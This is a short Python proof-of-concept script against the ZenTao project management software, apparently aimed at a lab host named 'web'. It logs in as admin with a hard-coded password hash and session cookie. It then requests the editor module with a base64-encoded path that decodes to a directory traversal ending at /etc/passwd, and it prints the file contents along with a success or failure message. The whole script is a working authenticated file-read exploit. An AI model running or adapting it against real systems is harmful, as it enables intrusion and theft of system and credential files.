#import sys
#reload(sys)
#sys.setdefaultencoding('utf-8')
import os
import requests

headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,zh-TW;q=0.8",
               "Connection": "close"}

def login1():
    url = "http://web:80/zentao/user-login-L3plbnRhby9pbmRleC5odG1s.html"
    cookies = {"lang": "zh-cn", "theme": "default", "windowWidth": "1536", "windowHeight": "722", "sid": "e52t2obj21ll5trk6gt16lgna3"}

    data = {"account": "admin", "password": "e10adc3949ba59abbe56e057f20f883e", "referer": "http://web:80/zentao/user-login-L3plbnRhby9pbmRleC5odG1s.html"}
    r = requests.post(url, headers=headers, cookies=cookies, data=data)


def login2():

    url = "http://web:80/zentao/index.html"
    cookies = {"lang": "zh-cn", "theme": "default", "windowWidth": "1536", "windowHeight": "722", "sid": "e52t2obj21ll5trk6gt16lgna3"}

    data = {"account": "admin", "password": "e10adc3949ba59abbe56e057f20f883e", "referer": "http://web:80/zentao/index.html"}
    r = requests.post(url, headers=headers, cookies=cookies, data=data)


def fileread():
    url = "http://web:80/zentao/index.php?m=editor&f=edit&filePath=L29wdC96Ym94L2FwcC96ZW50YW8vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==&action=edit"
    cookies = {"theme": "default", "preProductID": "1", "preBranch": "0", "storyModule": "0", "lastProduct": "1",
               "productStoryOrder": "id_desc", "qaBugOrder": "id_desc", "lang": "zh-cn", "windowHeight": "722",
               "windowWidth": "1536", "sid": "e52t2obj21ll5trk6gt16lgna3"}

    requests.get(url, headers=headers, cookies=cookies)
    #response = requests.get(url, headers=headers, cookies=cookies)
    #print('response_code', response.status_code)
    #print('response', response.text)
    r=requests.get(url, headers=headers, cookies=cookies)
    print(r.text)
    print(r.status_code)
    if (r.status_code == 200):
       print("Poc success")
    else:
       print("Poc fail")
    
if __name__ == '__main__':
    login1()
    login2()
    fileread()

